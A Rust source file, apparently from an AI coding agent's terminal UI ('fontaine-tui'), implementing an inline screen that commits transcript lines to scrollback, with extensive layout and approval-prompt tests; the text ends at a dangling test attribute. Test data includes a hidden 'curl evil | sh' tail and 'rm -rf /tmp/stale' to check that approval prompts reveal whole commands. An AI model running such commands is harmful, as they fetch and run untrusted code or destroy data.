//! An inline terminal whose live area always ends on the terminal's bottom row. Settled transcript
//! lines are written once into the terminal's own scrollback; only the live area is redrawn. Rows
//! the content does not need are padding between the transcript tail and the input box, and later
//! commits consume them before anything scrolls.

use std::mem;

use ratatui::Terminal;
use ratatui::TerminalOptions;
use ratatui::Viewport;
use ratatui::backend::{Backend, ClearType, TestBackend, WindowSize};
use ratatui::buffer::Cell;
use ratatui::layout::{Position, Rect, Size};
use ratatui::widgets::{Paragraph, Widget};

use crate::app::App;
use crate::view;

/// Rows handed to `insert_before` at a time, so the count always fits a `u16`.
const INSERT_CHUNK: usize = 512;

/// A backend that can be told where the cursor is, so a rebuilt terminal does not have to ask.
pub trait Anchor {
    /// Answers the next cursor-position query with `at`.
    fn arm(&mut self, at: Position);
}

impl Anchor for TestBackend {
    // A test backend answers from its own cursor.
    fn arm(&mut self, _at: Position) {}
}

/// Wraps a backend so exactly one cursor-position query can be answered locally. On a real
/// terminal that query is a round trip through stdin, which is slow over ssh and times out on
/// terminals that do not answer.
pub struct Anchored<B> {
    inner: B,
    anchor: Option<Position>,
}

impl<B> Anchored<B> {
    pub fn new(inner: B) -> Self {
        Anchored {
            inner,
            anchor: None,
        }
    }
}

impl<B> Anchor for Anchored<B> {
    fn arm(&mut self, at: Position) {
        self.anchor = Some(at);
    }
}

impl<B: Backend> Backend for Anchored<B> {
    type Error = B::Error;

    fn draw<'a, I>(&mut self, content: I) -> Result<(), Self::Error>
    where
        I: Iterator<Item = (u16, u16, &'a Cell)>,
    {
        self.inner.draw(content)
    }

    fn append_lines(&mut self, n: u16) -> Result<(), Self::Error> {
        self.inner.append_lines(n)
    }

    fn hide_cursor(&mut self) -> Result<(), Self::Error> {
        self.inner.hide_cursor()
    }

    fn show_cursor(&mut self) -> Result<(), Self::Error> {
        self.inner.show_cursor()
    }

    fn get_cursor_position(&mut self) -> Result<Position, Self::Error> {
        match self.anchor.take() {
            Some(at) => Ok(at),
            None => self.inner.get_cursor_position(),
        }
    }

    fn set_cursor_position<P: Into<Position>>(&mut self, position: P) -> Result<(), Self::Error> {
        self.inner.set_cursor_position(position)
    }

    fn clear(&mut self) -> Result<(), Self::Error> {
        self.inner.clear()
    }

    fn clear_region(&mut self, clear_type: ClearType) -> Result<(), Self::Error> {
        self.inner.clear_region(clear_type)
    }

    fn size(&self) -> Result<Size, Self::Error> {
        self.inner.size()
    }

    fn window_size(&mut self) -> Result<WindowSize, Self::Error> {
        self.inner.window_size()
    }

    fn flush(&mut self) -> Result<(), Self::Error> {
        self.inner.flush()
    }

    fn scroll_region_up(
        &mut self,
        region: std::ops::Range<u16>,
        line_count: u16,
    ) -> Result<(), Self::Error> {
        self.inner.scroll_region_up(region, line_count)
    }

    fn scroll_region_down(
        &mut self,
        region: std::ops::Range<u16>,
        line_count: u16,
    ) -> Result<(), Self::Error> {
        self.inner.scroll_region_down(region, line_count)
    }
}

pub struct Screen<B: Backend + Anchor> {
    terminal: Terminal<B>,
    height: u16,
    /// A stand-in left in the old `Terminal` while its backend moves to the new one.
    placeholder: fn() -> B,
}

impl<B: Backend + Anchor> Screen<B> {
    /// The live area starts as the whole screen: earlier output above the cursor scrolls into the
    /// terminal's history.
    pub fn new(backend: B, placeholder: fn() -> B) -> Result<Self, B::Error> {
        let height = backend.size()?.height;
        let terminal = Terminal::with_options(
            backend,
            TerminalOptions {
                viewport: Viewport::Inline(height),
            },
        )?;
        Ok(Screen {
            terminal,
            height,
            placeholder,
        })
    }

    /// Commits the transcript rows that no longer fit above the input, sizes the live area to
    /// reach the bottom row, and draws it. A transcript that fits stays in the live area, so a
    /// short one sits directly above the input instead of at the top of the screen.
    pub fn render(&mut self, app: &mut App) -> Result<(), B::Error> {
        self.draw_frame(app, false)
    }

    /// Writes everything still held back to scrollback, for exit: the live area is about to be
    /// cleared.
    pub fn commit_all(&mut self, app: &mut App) -> Result<(), B::Error> {
        self.draw_frame(app, true)
    }

    fn draw_frame(&mut self, app: &mut App, all: bool) -> Result<(), B::Error> {
        self.terminal.autoresize()?;
        let width = self.terminal.get_frame().area().width;
        let terminal_height = self.terminal.size()?.height;
        let columns = usize::from(width).max(1);
        let lines = if all {
            app.transcript.commit_all(columns, &app.theme)
        } else {
            let mut lines = app.transcript.take_retired(columns, &app.theme);
            let chrome = view::chrome(app, width, terminal_height);
            let held = app.transcript.live_lines(columns, &app.theme).len();
            let over = (held + chrome).saturating_sub(usize::from(terminal_height));
            lines.extend(app.transcript.commit_within(columns, &app.theme, over));
            lines
        };
        let content = view::height(app, width, terminal_height);
        let top = self.terminal.get_frame().area().y;
        let free = usize::from(terminal_height.saturating_sub(top)).saturating_sub(lines.len());
        let wanted = usize::from(content)
            .max(free)
            .min(usize::from(terminal_height)) as u16;
        if wanted != self.height {
            self.rebuild(wanted)?;
        }
        // ratatui scrolls the rows above the viewport as a region, and a one-row region is
        // invalid DECSTBM that terminals ignore, so the whole screen scrolls with the viewport
        // still in it. The viewport is repainted from scratch to undo that.
        let one_row_region = self.terminal.get_frame().area().y <= 1 && !lines.is_empty();
        for chunk in lines.chunks(INSERT_CHUNK) {
            let rows = chunk.to_vec();
            self.terminal.insert_before(chunk.len() as u16, |buf| {
                Paragraph::new(rows).render(buf.area, buf);
            })?;
        }
        if one_row_region {
            self.terminal.clear()?;
        }
        self.terminal.draw(|frame| view::draw(frame, app))?;
        Ok(())
    }

    /// ratatui cannot resize an inline viewport, so the terminal is rebuilt at the same top row.
    fn rebuild(&mut self, height: u16) -> Result<(), B::Error> {
        let top = Position::new(0, self.terminal.get_frame().area().y);
        let backend = self.terminal.backend_mut();
        backend.set_cursor_position(top)?;
        backend.clear_region(ClearType::AfterCursor)?;
        let mut real = mem::replace(backend, (self.placeholder)());
        real.arm(top);
        let terminal = Terminal::with_options(
            real,
            TerminalOptions {
                viewport: Viewport::Inline(height),
            },
        )?;
        // The replaced terminal shows the cursor when it drops, so hide it only after the swap.
        self.terminal = terminal;
        self.terminal.hide_cursor()?;
        self.height = height;
        Ok(())
    }

    /// Clears the live area and leaves the cursor at its top, for exit.
    pub fn clear_live(&mut self) -> Result<(), B::Error> {
        let top = self.terminal.get_frame().area().y;
        let backend = self.terminal.backend_mut();
        backend.set_cursor_position(Position::new(0, top))?;
        backend.clear_region(ClearType::AfterCursor)?;
        backend.flush()
    }

    /// Redraws the live area from scratch at the row the cursor is on, after a child process
    /// has had the terminal.
    pub fn resume(&mut self) -> Result<(), B::Error> {
        self.rebuild(self.height)
    }

    pub fn backend(&self) -> &B {
        self.terminal.backend()
    }

    /// The viewport rect.
    pub fn area(&mut self) -> Rect {
        self.terminal.get_frame().area()
    }
}

/// Rows of text, one string per line, for tests.
#[cfg(test)]
fn rows(buffer: &ratatui::buffer::Buffer) -> Vec<String> {
    let width = usize::from(buffer.area.width);
    buffer
        .content()
        .chunks(width)
        .map(|row| row.iter().map(|c| c.symbol()).collect::<String>())
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use fontaine_core::config::PermissionMode;
    use fontaine_core::permissions::{ApprovalRequest, Offers};
    use fontaine_core::turn::SessionEvent;
    use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
    use tokio::sync::oneshot;

    fn placeholder() -> TestBackend {
        TestBackend::new(1, 1)
    }

    fn screen(width: u16, height: u16) -> Screen<TestBackend> {
        Screen::new(TestBackend::new(width, height), placeholder).unwrap()
    }

    fn app() -> App {
        App::new(PermissionMode::Manual, "model".into())
    }

    /// Scrollback followed by the visible rows.
    fn everything(screen: &Screen<TestBackend>) -> Vec<String> {
        let mut all = rows(screen.backend().scrollback());
        all.extend(rows(screen.backend().buffer()));
        all
    }

    fn above(screen: &mut Screen<TestBackend>) -> Vec<String> {
        let top = usize::from(screen.area().top());
        let mut all = rows(screen.backend().scrollback());
        all.extend(rows(screen.backend().buffer()).into_iter().take(top));
        all
    }

    fn live(screen: &mut Screen<TestBackend>) -> Vec<String> {
        let area = screen.area();
        rows(screen.backend().buffer())
            .into_iter()
            .skip(usize::from(area.top()))
            .take(usize::from(area.height))
            .collect()
    }

    fn nonblank(rows: Vec<String>) -> Vec<String> {
        rows.into_iter()
            .map(|r| r.trim_end().to_string())
            .filter(|r| !r.is_empty())
            .collect()
    }

    fn approval_request(command: &str) -> ApprovalRequest {
        ApprovalRequest {
            tool: "shell".into(),
            agent: "main".into(),
            tool_use_id: None,
            args: serde_json::json!({ "command": command }),
            summary: command.into(),
            tier: fontaine_core::tier::Tier::CriticalPath,
            reason: "needs approval".into(),
            offers: Offers::default(),
            proposed_rule: None,
        }
    }

    /// The index of the input box's top border among the visible rows.
    fn input_top(screen: &mut Screen<TestBackend>) -> usize {
        rows(screen.backend().buffer())
            .iter()
            .position(|r| r.contains("message ·"))
            .expect("the input box is drawn")
    }

    fn warning(app: &mut App, text: &str) {
        app.transcript.warning(text, Some(format!("fix `{text}`")));
    }

    #[test]
    fn a_short_transcript_stays_above_the_input_and_nothing_is_committed() {
        let mut screen = screen(40, 12);
        let mut app = app();
        app.transcript.user("hello".into());
        app.on_event(SessionEvent::Assistant("the reply".into()));
        screen.render(&mut app).unwrap();
        assert!(nonblank(rows(screen.backend().scrollback())).is_empty());
        let visible = rows(screen.backend().buffer());
        let top = input_top(&mut screen);
        assert!(visible[top - 1].contains("the reply"), "{visible:?}");
        assert!(visible[top - 3].contains("> hello"), "{visible:?}");
        assert!(visible[..top - 3].iter().all(|r| r.trim().is_empty()));
    }

    #[test]
    fn settled_lines_go_to_scrollback_once_they_no_longer_fit_above_the_input() {
        let mut screen = screen(40, 8);
        let mut app = app();
        app.transcript.user("hello".into());
        for reply in ["one", "two", "three"] {
            app.on_event(SessionEvent::Assistant(reply.into()));
        }
        screen.render(&mut app).unwrap();
        assert_eq!(nonblank(above(&mut screen)), vec!["> hello"]);
        let live = live(&mut screen).join("\n");
        assert!(live.contains("message"));
        assert!(live.contains("three"));
        assert!(!live.contains("hello"));
    }

    #[test]
    fn a_streaming_reply_commits_only_completed_rows_and_only_when_over_budget() {
        let mut screen = screen(10, 8);
        let mut app = app();
        app.on_event(SessionEvent::AssistantDelta("abc".into()));
        screen.render(&mut app).unwrap();
        assert!(nonblank(above(&mut screen)).is_empty());
        assert!(live(&mut screen).join("\n").contains("abc"));
        app.on_event(SessionEvent::AssistantDelta("defghijkl".into()));
        screen.render(&mut app).unwrap();
        assert!(
            nonblank(above(&mut screen)).is_empty(),
            "two rows fit above the input"
        );
        app.on_event(SessionEvent::AssistantDelta(
            "mnopqrstuvwxyz0123456789ABCDE".into(),
        ));
        screen.render(&mut app).unwrap();
        assert_eq!(nonblank(above(&mut screen)), vec!["abcdefghij"]);
        assert!(live(&mut screen).join("\n").contains("E"));
    }

    #[test]
    fn held_warnings_stay_anchored_while_a_reply_streams_across_the_boundary() {
        let mut screen = screen(30, 14);
        let mut app = app();
        warning(&mut app, "first");
        warning(&mut app, "second");
        screen.render(&mut app).unwrap();
        let top = input_top(&mut screen);
        let visible = rows(screen.backend().buffer());
        assert!(visible[top - 1].contains("fix `second`"), "{visible:?}");
        let mut streamed = String::new();
        for i in 0..120 {
            let word = format!("w{i} ");
            streamed.push_str(&word);
            app.on_event(SessionEvent::AssistantDelta(word));
            screen.render(&mut app).unwrap();
            if i == 2 {
                let visible = rows(screen.backend().buffer());
                assert!(nonblank(rows(screen.backend().scrollback())).is_empty());
                assert!(visible[input_top(&mut screen) - 1].contains("w0 w1 w2"));
            }
        }
        let all = nonblank(everything(&screen));
        let warnings: Vec<&String> = all
            .iter()
            .filter(|r| r.contains("fix `") || r.contains("⚠"))
            .collect();
        assert_eq!(warnings.len(), 4, "{all:?}");
        let body: String = all
            .iter()
            .filter(|r| {
                r.starts_with('w') || r.chars().next().is_some_and(|c| c.is_ascii_alphanumeric())
            })
            .flat_map(|r| r.chars())
            .collect();
        let squeezed: String = streamed.chars().filter(|c| !c.is_whitespace()).collect();
        assert!(body.replace(' ', "").contains(&squeezed), "{all:?}");
        assert!(
            rows(screen.backend().scrollback())
                .join("\n")
                .contains("first"),
            "older entries commit before any stream row"
        );
    }

    #[test]
    fn a_long_approval_leaves_the_pending_call_live() {
        let mut screen = screen(40, 14);
        let mut app = app();
        app.on_event(SessionEvent::ToolCall {
            id: "t".into(),
            tool: "shell".into(),
            args: serde_json::json!({ "command": "sleep 9" }),
        });
        let (tx, _rx) = oneshot::channel();
        app.begin_approval(approval_request(&"x".repeat(600)), tx);
        screen.render(&mut app).unwrap();

        assert!(
            !rows(screen.backend().scrollback())
                .join("\n")
                .contains("sleep 9"),
            "the pending call must not be written to scrollback"
        );
        assert!(live(&mut screen).join("\n").contains("sleep 9"));
    }

    #[test]
    fn a_pending_call_over_budget_is_committed_so_no_row_is_hidden() {
        let mut screen = screen(30, 8);
        let mut app = app();
        app.on_event(SessionEvent::ToolCall {
            id: "t".into(),
            tool: "shell".into(),
            args: serde_json::json!({ "command": "sleep 9" }),
        });
        for i in 0..8 {
            app.transcript.notice(format!("n{i}"));
            screen.render(&mut app).unwrap();
        }
        let all = nonblank(everything(&screen)).join("\n");
        assert_eq!(all.matches("sleep 9").count(), 1, "{all}");
        for i in 0..8 {
            assert_eq!(all.matches(&format!("· n{i}")).count(), 1, "{all}");
        }
        let held = app.transcript.live_lines(30, &app.theme).len();
        assert!(held + view::chrome(&app, 30, 8) <= 8);
    }

    #[test]
    fn an_overlay_growing_the_chrome_commits_held_entries() {
        let mut screen = screen(40, 14);
        let mut app = app();
        for i in 0..4 {
            app.transcript.notice(format!("n{i}"));
        }
        screen.render(&mut app).unwrap();
        assert!(nonblank(rows(screen.backend().scrollback())).is_empty());
        let (tx, _rx) = oneshot::channel();
        app.begin_approval(approval_request("ls"), tx);
        screen.render(&mut app).unwrap();
        let held = app.transcript.live_lines(40, &app.theme).len();
        assert!(held + view::chrome(&app, 40, 14) <= 14);
        let all = nonblank(everything(&screen)).join("\n");
        for i in 0..4 {
            assert_eq!(all.matches(&format!("· n{i}")).count(), 1, "{all}");
        }
    }

    #[test]
    fn narrowing_the_terminal_commits_entries_that_stop_fitting() {
        let mut screen = screen(60, 12);
        let mut app = app();
        for i in 0..4 {
            app.transcript.notice(format!("{i} {}", "word ".repeat(10)));
        }
        screen.render(&mut app).unwrap();
        assert!(nonblank(rows(screen.backend().scrollback())).is_empty());
        screen.terminal.backend_mut().resize(20, 12);
        screen.render(&mut app).unwrap();
        let held = app.transcript.live_lines(20, &app.theme).len();
        assert!(held + view::chrome(&app, 20, 12) <= 12);
        assert!(!nonblank(rows(screen.backend().scrollback())).is_empty());
    }

    #[test]
    fn retired_entries_reach_scrollback_before_the_new_conversation() {
        let mut screen = screen(40, 12);
        let mut app = app();
        warning(&mut app, "old");
        screen.render(&mut app).unwrap();
        app.transcript.clear();
        app.transcript.notice("cleared");
        screen.render(&mut app).unwrap();
        let all = nonblank(everything(&screen));
        let old = all
            .iter()
            .position(|r| r.contains("old"))
            .expect("old kept");
        let new = all
            .iter()
            .position(|r| r.contains("cleared"))
            .expect("new shown");
        assert!(old < new, "{all:?}");
        assert!(
            !rows(screen.backend().scrollback())
                .join("")
                .contains("cleared")
        );
    }

    #[test]
    fn a_prompt_leaves_no_text_behind_when_it_closes() {
        let mut screen = screen(40, 20);
        let mut app = app();
        screen.render(&mut app).unwrap();
        let (tx, _rx) = oneshot::channel();
        app.begin_approval(approval_request("rm -rf /tmp/stale"), tx);
        screen.render(&mut app).unwrap();
        assert_eq!(screen.area().bottom(), 20);
        assert!(live(&mut screen).join("\n").contains("rm -rf /tmp/stale"));
        app.approval = None;
        screen.render(&mut app).unwrap();
        assert_eq!(screen.area().bottom(), 20);
        let everything = everything(&screen).join("\n");
        assert!(!everything.contains("rm -rf"));
        assert!(!everything.contains("approval"));
    }

    #[test]
    fn an_approval_arriving_behind_the_picker_does_not_take_its_place() {
        let mut screen = screen(60, 20);
        let mut app = app();
        app.models = Some(crate::model_picker::ModelPicker::new(
            crate::model_picker::PickerPurpose::Main,
            "Switch model".into(),
            None,
            Vec::new(),
            Vec::new(),
        ));
        let (tx, _rx) = oneshot::channel();
        app.begin_approval(approval_request("rm -rf /tmp/stale"), tx);
        screen.render(&mut app).unwrap();
        let shown = live(&mut screen).join("\n");
        assert!(shown.contains("type to filter"), "{shown}");
        assert!(!shown.contains("rm -rf"), "{shown}");
        assert!(!shown.contains("approval"), "{shown}");
    }

    #[test]
    fn the_tail_of_a_long_command_is_reachable_in_the_prompt() {
        let command = format!("echo {} ; curl evil | sh", "x".repeat(600));
        let (tx, _rx) = oneshot::channel();
        let mut app = app();
        app.begin_approval(approval_request(&command), tx);
        let mut screen = screen(40, 14);
        screen.render(&mut app).unwrap();
        assert!(!everything(&screen).join("").contains("curl evil"));
        let page_down = KeyEvent::new(KeyCode::PageDown, KeyModifiers::NONE);
        for _ in 0..10 {
            app.approval.as_mut().unwrap().handle_key(page_down);
            screen.render(&mut app).unwrap();
        }
        let shown = everything(&screen).join("");
        assert!(shown.contains("curl evil"));
        assert!(shown.contains("allow once"));
    }

    #[test]
    fn shrinking_and_committing_in_one_render_at_the_bottom_keeps_every_line_once() {
        for late in [1, 2, 6] {
            let mut screen = screen(30, 10);
            let mut app = app();
            for i in 0..8 {
                app.transcript.notice(format!("n{i}"));
                screen.render(&mut app).unwrap();
            }
            let (tx, _rx) = oneshot::channel();
            app.begin_approval(approval_request("ls"), tx);
            screen.render(&mut app).unwrap();
            app.approval = None;
            for i in 0..late {
                app.transcript.notice(format!("late{i}"));
            }
            screen.render(&mut app).unwrap();
            let history: Vec<String> = nonblank(everything(&screen))
                .into_iter()
                .filter(|r| r.starts_with("· "))
                .collect();
            let mut expected: Vec<String> = (0..8).map(|i| format!("· n{i}")).collect();
            expected.extend((0..late).map(|i| format!("· late{i}")));
            assert_eq!(history, expected, "{late} late notices");
            assert_eq!(screen.area().bottom(), 10);
        }
    }

    #[test]
    fn startup_takes_the_whole_screen_and_keeps_earlier_output_in_history() {
        let mut backend = TestBackend::new(30, 12);
        let cells: Vec<(u16, u16, Cell)> = ["one", "two", "three"]
            .iter()
            .enumerate()
            .flat_map(|(y, text)| {
                text.chars().enumerate().map(move |(x, c)| {
                    let mut cell = Cell::default();
                    cell.set_symbol(&c.to_string());
                    (x as u16, y as u16, cell)
                })
            })
            .collect();
        backend
            .draw(cells.iter().map(|(x, y, cell)| (*x, *y, cell)))
            .unwrap();
        backend.set_cursor_position(Position::new(0, 4)).unwrap();
        let mut screen = Screen::new(backend, placeholder).unwrap();
        let mut app = app();
        screen.render(&mut app).unwrap();
        assert_eq!(screen.area(), Rect::new(0, 0, 30, 12));
        let history = nonblank(rows(screen.backend().scrollback()));
        assert_eq!(history, vec!["one", "two", "three"]);
        let visible = rows(screen.backend().buffer());
        assert!(visible[11].contains("manual"));
        assert!(
            visible[7..11].iter().any(|r| r.contains("message")),
            "{visible:?}"
        );
        assert!(visible[..8].iter().all(|r| r.trim().is_empty()));
    }

    #[test]
    fn first_entries_sit_directly_above_the_input() {
        let mut screen = screen(30, 12);
        let mut app = app();
        app.transcript.notice(String::from("a"));
        app.transcript.notice(String::from("b"));
        screen.render(&mut app).unwrap();
        let visible = rows(screen.backend().buffer());
        let top = input_top(&mut screen);
        assert!(visible[top - 2].contains("a"), "{visible:?}");
        assert!(visible[top - 1].contains("b"), "{visible:?}");
        assert!(visible[..top - 2].iter().all(|r| r.trim().is_empty()));
        assert!(nonblank(rows(screen.backend().scrollback())).is_empty());
        assert_eq!(screen.area().bottom(), 12);
    }

    /// Renders a scripted session and checks the bottom-row rule after every step.
    fn scripted(screen: &mut Screen<TestBackend>, height: u16) -> Vec<String> {
        let mut app = app();
        let mut expected = Vec::new();
        let step = |screen: &mut Screen<TestBackend>, app: &mut App| {
            screen.render(app).unwrap();
            let area = screen.area();
            assert_eq!(area.bottom(), height);
            let content = view::height(app, area.width, height);
            assert_eq!(area.height, content.max(height - area.top()));
            let held = app
                .transcript
                .live_lines(usize::from(area.width), &app.theme);
            // Only a reply's live last row can stay held once the chrome alone fills the screen.
            let chrome = view::chrome(app, area.width, height);
            assert!(
                held.len() + chrome <= usize::from(height) || chrome >= usize::from(height),
                "{} held + {chrome} chrome",
                held.len()
            );
        };
        for i in 0..4 {
            app.transcript.notice(format!("note{i}"));
            expected.push(format!("· note{i}"));
            step(screen, &mut app);
        }
        app.on_event(SessionEvent::AssistantDelta("abcdefghij".repeat(3)));
        step(screen, &mut app);
        for _ in 0..3 {
            app.on_event(SessionEvent::AssistantDelta("klmnopqrst".into()));
            step(screen, &mut app);
        }
        let (tx, _rx) = oneshot::channel();
        app.begin_approval(approval_request("ls"), tx);
        step(screen, &mut app);
        app.approval = None;
        step(screen, &mut app);
        app.input.insert_str("a\nb\nc\nd\ne");
        step(screen, &mut app);
        app.input.take();
        step(screen, &mut app);
        for i in 0..14 {
            app.transcript.notice(format!("later{i}"));
            expected.push(format!("· later{i}"));
            step(screen, &mut app);
        }
        expected
    }

    /// A terminal emulator behind the real crossterm backend, so a test sees what a terminal does
    /// with the bytes ratatui writes rather than what ratatui believes it wrote.
    mod emulated {
        use super::*;
        use ratatui::backend::CrosstermBackend;
        use std::io::{self, Write};
        use std::sync::{Arc, Mutex};

        fn nz(n: u16) -> std::num::NonZeroU16 {
            std::num::NonZeroU16::new(n).expect("the emulator needs at least one row and column")
        }

        type Emulator = Arc<Mutex<vt100::Parser>>;

        struct Sink(Emulator);

        impl Write for Sink {
            fn write(&mut self, bytes: &[u8]) -> io::Result<usize> {
                self.0.lock().unwrap().process(bytes);
                Ok(bytes.len())
            }

            fn flush(&mut self) -> io::Result<()> {
                Ok(())
            }
        }

        /// Answers every query from the emulator instead of a tty.
        pub struct Emu {
            inner: CrosstermBackend<Sink>,
            emulator: Emulator,
        }

        impl Emu {
            fn with(emulator: Emulator) -> Self {
                Emu {
                    inner: CrosstermBackend::new(Sink(emulator.clone())),
                    emulator,
                }
            }
        }

        impl Backend for Emu {
            type Error = io::Error;

            fn draw<'a, I>(&mut self, content: I) -> io::Result<()>
            where
                I: Iterator<Item = (u16, u16, &'a Cell)>,
            {
                self.inner.draw(content)
            }

            fn append_lines(&mut self, n: u16) -> io::Result<()> {
                self.inner.append_lines(n)
            }

            fn hide_cursor(&mut self) -> io::Result<()> {
                self.inner.hide_cursor()
            }

            fn show_cursor(&mut self) -> io::Result<()> {
                self.inner.show_cursor()
            }

            fn get_cursor_position(&mut self) -> io::Result<Position> {
                let (row, col) = self.emulator.lock().unwrap().screen().cursor_position();
                Ok(Position::new(col, row))
            }

            fn set_cursor_position<P: Into<Position>>(&mut self, position: P) -> io::Result<()> {
                self.inner.set_cursor_position(position)
            }

            fn clear(&mut self) -> io::Result<()> {
                self.inner.clear()
            }

            fn clear_region(&mut self, clear_type: ClearType) -> io::Result<()> {
                self.inner.clear_region(clear_type)
            }

            fn size(&self) -> io::Result<Size> {
                let (rows, cols) = self.emulator.lock().unwrap().screen().size();
                Ok(Size::new(cols.get(), rows.get()))
            }

            fn window_size(&mut self) -> io::Result<WindowSize> {
                let size = self.size()?;
                Ok(WindowSize {
                    columns_rows: size,
                    pixels: Size::new(0, 0),
                })
            }

            fn flush(&mut self) -> io::Result<()> {
                Backend::flush(&mut self.inner)
            }

            fn scroll_region_up(
                &mut self,
                region: std::ops::Range<u16>,
                line_count: u16,
            ) -> io::Result<()> {
                self.inner.scroll_region_up(region, line_count)
            }

            fn scroll_region_down(
                &mut self,
                region: std::ops::Range<u16>,
                line_count: u16,
            ) -> io::Result<()> {
                self.inner.scroll_region_down(region, line_count)
            }
        }

        pub type Real = Anchored<Emu>;

        /// A stand-in whose drop writes go to a throwaway emulator.
        fn spare() -> Real {
            Anchored::new(Emu::with(Arc::new(Mutex::new(vt100::Parser::new(
                nz(1),
                nz(1),
                0,
            )))))
        }

        pub struct Harness {
            pub screen: Screen<Real>,
            emulator: Emulator,
            height: u16,
        }

        impl Harness {
            pub fn new(width: u16, height: u16) -> Self {
                let emulator =
                    Arc::new(Mutex::new(vt100::Parser::new(nz(height), nz(width), 1000)));
                let backend = Anchored::new(Emu::with(emulator.clone()));
                Harness {
                    screen: Screen::new(backend, spare).unwrap(),
                    emulator,
                    height,
                }
            }

            /// The emulator's visible rows, trailing blanks trimmed.
            pub fn real(&self) -> Vec<String> {
                let parser = self.emulator.lock().unwrap();
                let screen = parser.screen();
                screen
                    .rows(0, screen.size().1.get())
                    .map(|r| r.trim_end().to_string())
                    .collect()
            }

            /// ratatui's idea of the rows: blank above the viewport, its buffer below.
            fn model(&mut self, app: &App) -> Vec<String> {
                let area = self.screen.area();
                let mut drawn = Terminal::new(TestBackend::new(area.width, area.height)).unwrap();
                drawn.draw(|frame| view::draw(frame, app)).unwrap();
                let mut all = vec![String::new(); usize::from(area.top())];
                all.extend(
                    rows(drawn.backend().buffer())
                        .into_iter()
                        .map(|r| r.trim_end().to_string()),
                );
                all
            }

            /// Renders, then checks the emulator against ratatui's model and the input box's
            /// place above the status row.
            pub fn render(&mut self, app: &mut App, what: &str) {
                self.screen.render(app).unwrap();
                let area = self.screen.area();
                let model = self.model(app);
                let real = self.real();
                let top = usize::from(area.top());
                let ctx = || {
                    format!(
                        "{what} ({}x{})\nmodel:\n{}\nreal:\n{}",
                        area.width,
                        self.height,
                        model.join("\n"),
                        real.join("\n")
                    )
                };
                assert_eq!(area.bottom(), self.height, "{}", ctx());
                assert_eq!(real[top..], model[top..], "{}", ctx());
                let h = usize::from(self.height);
                let box_top = &real[h - 4];
                assert!(box_top.contains("message ·"), "{}", ctx());
                assert!(real[h - 3].starts_with('│'), "{}", ctx());
                assert!(
                    real[h - 2].starts_with('└') || real[h - 2].starts_with('╰'),
                    "{}",
                    ctx()
                );
            }
        }
    }

    fn started(app: &mut App, n: usize) {
        app.on_event(SessionEvent::ToolCall {
            id: format!("t{n}"),
            tool: "shell".into(),
            args: serde_json::json!({ "command": format!("sleep {} # a long argument", 20 + n) }),
        });
    }

    fn finished(app: &mut App, n: usize) {
        app.on_event(SessionEvent::ToolResult {
            id: format!("t{n}"),
            tool: "shell".into(),
            success: true,
            text: "done".into(),
        });
    }

    /// Fills the terminal's history, starts `calls` tool calls (one render each, or in one batch)
    /// and finishes them in order or reversed, checking every frame against the emulator.
    fn live_rows_scenario(width: u16, height: u16, calls: usize, batch: bool, reversed: bool) {
        let mut harness = emulated::Harness::new(width, height);
        let mut app = app();
        for i in 0..usize::from(height) + 4 {
            app.transcript.notice(format!("note {i}"));
            harness.render(&mut app, "filling");
        }
        if batch {
            (0..calls).for_each(|n| started(&mut app, n));
            harness.render(&mut app, "batch start");
        } else {
            for n in 0..calls {
                started(&mut app, n);
                harness.render(&mut app, &format!("start {n}"));
            }
        }
        let mut order: Vec<usize> = (0..calls).collect();
        if reversed {
            order.reverse();
        }
        for n in order {
            finished(&mut app, n);
            harness.render(&mut app, &format!("finish {n}"));
        }
    }

    #[test]
    fn issue_217_live_tool_rows_stay_above_the_prompt_box() {
        for calls in 1..=3 {
            for batch in [false, true] {
                for reversed in [false, true] {
                    live_rows_scenario(40, 10, calls, batch, reversed);
                }
            }
        }
    }

    #[test]
    fn issue_217_strided_matrix() {
        for height in (6..=24).step_by(4) {
            for width in (20..=80).step_by(10) {
                for calls in 1..=3 {
                    live_rows_scenario(width, height, calls, false, false);
                    live_rows_scenario(width, height, calls, true, true);
                }
            }
        }
    }

    /// The full local diagnostic: `cargo test -p fontaine-tui -- --ignored issue_217_full_sweep`.
    #[test]
    #[ignore]
    fn issue_217_full_sweep() {
        for height in 6..=24 {
            for width in 20..=80 {
                for calls in 1..=4 {
                    for batch in [false, true] {
                        for reversed in [false, true] {
                            live_rows_scenario(width, height, calls, batch, reversed);
                        }
                    }
                }
            }
        }
    }

    #[test]
    fn the_live_area_always_ends_on_the_bottom_row() {
        let mut screen = screen(30, 10);
        scripted(&mut screen, 10);
    }

    #[test]
    fn committed_lines_stay_contiguous() {
        let mut screen = screen(30, 10);
        let notices = scripted(&mut screen, 10);
        let mut trimmed = above(&mut screen)
            .iter()
            .map(|r| r.trim_end().to_string())
            .collect::<Vec<_>>();
        let history = nonblank(everything(&screen));
        while trimmed.last().is_some_and(|r| r.is_empty()) {
            trimmed.pop();
        }
        assert!(trimmed.iter().all(|r| !r.is_empty()), "{trimmed:?}");
        let notes: Vec<String> = history
            .into_iter()
            .filter(|r| r.starts_with("· "))
            .collect();
        assert_eq!(notes, notices);
    }

    #[test]
    fn a_taller_terminal_is_filled_on_the_next_render() {
        let mut screen = screen(30, 10);
        let mut app = app();
        screen.render(&mut app).unwrap();
        screen.terminal.backend_mut().resize(30, 16);
        screen.render(&mut app).unwrap();
        assert_eq!(screen.area().bottom(), 16);
    }

    #[test]
    fn an_armed_anchor_answers_one_cursor_query() {
        let mut inner = TestBackend::new(10, 10);
        inner.set_cursor_position(Position::new(3, 4)).unwrap();
        let mut backend = Anchored::new(inner);
        assert_eq!(backend.get_cursor_position().unwrap(), Position::new(3, 4));
        backend.arm(Position::new(0, 7));
        assert_eq!(backend.get_cursor_position().unwrap(), Position::new(0, 7));
        assert_eq!(backend.get_cursor_position().unwrap(), Position::new(3, 4));
    }

    #[test]
    fn clear_live_keeps_scrollback_and_blanks_the_live_rows() {
        let mut screen = screen(30, 10);
        let mut app = app();
        for i in 0..12 {
            app.transcript.notice(format!("n{i}"));
        }
        screen.render(&mut app).unwrap();
        screen.commit_all(&mut app).unwrap();
        let before = rows(screen.backend().scrollback());
        screen.clear_live().unwrap();
        assert_eq!(rows(screen.backend().scrollback()), before);
        assert!(nonblank(live(&mut screen)).is_empty());
        let expected: Vec<String> = (0..12).map(|i| format!("· n{i}")).collect();
        assert_eq!(nonblank(everything(&screen)), expected);
    }

    #[test]
